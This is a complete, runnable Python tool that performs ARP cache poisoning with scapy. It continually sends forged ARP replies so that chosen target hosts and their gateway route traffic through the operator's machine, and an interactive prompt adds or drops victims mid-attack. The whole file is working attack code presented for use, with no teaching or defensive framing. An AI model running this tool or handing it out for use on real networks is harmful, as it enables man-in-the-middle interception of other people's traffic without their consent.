#!/usr/bin/env python3
from dataclasses import dataclass
from typing import List, Tuple, Optional
import sys
import argparse
import threading
import queue
import time
from enum import Enum
from scapy.all import (
    ARP,
    Ether,
    get_if_addr,
    get_if_hwaddr,
    sr,
    sendp,
    conf
)

class Command(Enum):
    QUIT = ['quit', 'exit', 'stop', 'leave']
    ADD = ['add', 'insert']
    DELETE = ['del', 'delete', 'remove']
    LIST = ['list', 'show', 'status']
    HELP = ['help', '?']

@dataclass
class NetworkHost:
    ip: str
    mac: str

    def __str__(self) -> str:
        return f"{self.ip} ({self.mac})"

class ARPSpoofController:
    def __init__(self, interface: str, targets: List[NetworkHost], gateway: NetworkHost):
        self.interface = interface
        self.attacker_mac = get_if_hwaddr(interface)
        self.targets = targets
        self.gateway = gateway
        self.control_queue: queue.Queue = queue.Queue()
        self.poison_thread: Optional[threading.Thread] = None

    @staticmethod
    def get_mac(interface: str, target_ip: str) -> str:
        """Get MAC address for a given IP using ARP request."""
        source_ip = get_if_addr(interface)
        source_mac = get_if_hwaddr(interface)
        
        arp_request = ARP(
            hwsrc=source_mac,
            psrc=source_ip,
            hwdst='ff:ff:ff:ff:ff:ff',
            pdst=target_ip
        )
        
        reply, unans = sr(arp_request, timeout=5, verbose=0)
        if unans:
            raise Exception(f'Error finding MAC for {target_ip}, try using -i')
        return reply[0][1].hwsrc

    def send_arp_packet(self, target: NetworkHost, spoofed_host: NetworkHost) -> None:
        """Send a spoofed ARP packet with proper Ethernet frame."""
        # Create the Ethernet frame
        ether = Ether(
            src=self.attacker_mac,
            dst=target.mac
        )
        
        # Create the ARP payload
        arp = ARP(
            op=2,  # ARP reply (is-at)
            pdst=target.ip,
            hwdst=target.mac,
            psrc=spoofed_host.ip,
            hwsrc=self.attacker_mac
        )
        
        # Combine Ethernet frame and ARP packet and send
        packet = ether/arp
        sendp(packet, verbose=0, iface=self.interface)

    def poison_arp_caches(self) -> None:
        """Poison ARP caches of targets and gateway."""
        while True:
            if not self.control_queue.empty():
                cmd, *args = self.control_queue.get()
                if self.handle_command(cmd, *args):
                    break

            for target in self.targets:
                # Tell target that we are the gateway
                self.send_arp_packet(target, self.gateway)
                # Tell gateway that we are the target
                self.send_arp_packet(self.gateway, target)
            
            time.sleep(1)

    def restore_arp_caches(self, targets: List[NetworkHost], verbose: bool = True) -> None:
        """Restore original ARP cache entries."""
        print('Stopping the attack, restoring ARP cache')
        for _ in range(3):
            if verbose:
                print(f"Restoring {self.gateway}")
            
            for target in targets:
                if verbose:
                    print(f"Restoring {target}")
                
                # Restore target's ARP cache
                ether = Ether(src=self.gateway.mac, dst=target.mac)
                arp = ARP(
                    op=2,
                    pdst=target.ip,
                    hwdst=target.mac,
                    psrc=self.gateway.ip,
                    hwsrc=self.gateway.mac
                )
                sendp(ether/arp, verbose=0, iface=self.interface)
                
                # Restore gateway's ARP cache
                ether = Ether(src=target.mac, dst=self.gateway.mac)
                arp = ARP(
                    op=2,
                    pdst=self.gateway.ip,
                    hwdst=self.gateway.mac,
                    psrc=target.ip,
                    hwsrc=target.mac
                )
                sendp(ether/arp, verbose=0, iface=self.interface)
            
            time.sleep(1)
        print('Restored ARP caches')

    def handle_command(self, cmd: str, *args) -> bool:
        """Handle command from user input. Returns True if should exit."""
        cmd = cmd.lower()
        
        if cmd in Command.QUIT.value:
            self.restore_arp_caches(self.targets)
            return True
            
        elif cmd in Command.ADD.value and args:
            try:
                new_target = NetworkHost(args[0], self.get_mac(self.interface, args[0]))
                self.targets.append(new_target)
                print(f"Added target: {new_target}")
            except Exception as e:
                print(f"Failed to add target: {e}")
                
        elif cmd in Command.DELETE.value and args:
            target_ip = args[0]
            targets_to_remove = [t for t in self.targets if t.ip == target_ip]
            if targets_to_remove:
                self.targets.remove(targets_to_remove[0])
                self.restore_arp_caches(targets_to_remove, False)
                print(f"Removed target: {targets_to_remove[0]}")
            else:
                print(f"{target_ip} not in target list")
                
        elif cmd in Command.LIST.value:
            print('Current targets:')
            print(f'Gateway: {self.gateway}')
            for target in self.targets:
                print(target)
                
        return False

    def start(self) -> None:
        """Start the ARP spoofing attack."""
        print(f'Using interface {self.interface} ({self.attacker_mac})')
        
        self.poison_thread = threading.Thread(
            target=self.poison_arp_caches
        )
        self.poison_thread.start()

        try:
            while self.poison_thread.is_alive():
                command = input('arpspoof# ').split()
                if not command:
                    continue
                    
                cmd = command[0]
                if cmd in Command.HELP.value:
                    print(
                        "add <IP>: add IP address to target list\n"
                        "del <IP>: remove IP address from target list\n"
                        "list: print all current targets\n"
                        "exit: stop poisoning and exit"
                    )
                else:
                    self.control_queue.put((cmd, *command[1:]))
                    
        except KeyboardInterrupt:
            self.control_queue.put(('quit',))
            self.poison_thread.join()

def parse_args() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description='Perform ARP poisoning between a gateway and several targets'
    )
    parser.add_argument(
        '-i', '--interface',
        dest='interface',
        help='interface to send from'
    )
    parser.add_argument(
        '-t', '--targets',
        dest='targets',
        help='comma-separated list of IP addresses',
        required=True
    )
    parser.add_argument(
        '-g', '--gateway',
        dest='gateway',
        help='IP address of the gateway',
        required=True
    )
    return parser.parse_args()

def main() -> None:
    args = parse_args()
    interface = args.interface or conf.iface

    try:
        # Initialize gateway
        gateway = NetworkHost(
            args.gateway,
            ARPSpoofController.get_mac(interface, args.gateway)
        )
        
        # Initialize targets
        targets = [
            NetworkHost(ip.strip(), ARPSpoofController.get_mac(interface, ip.strip()))
            for ip in args.targets.split(',')
        ]
        
        # Start ARP spoofing
        controller = ARPSpoofController(interface, targets, gateway)
        controller.start()
        
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
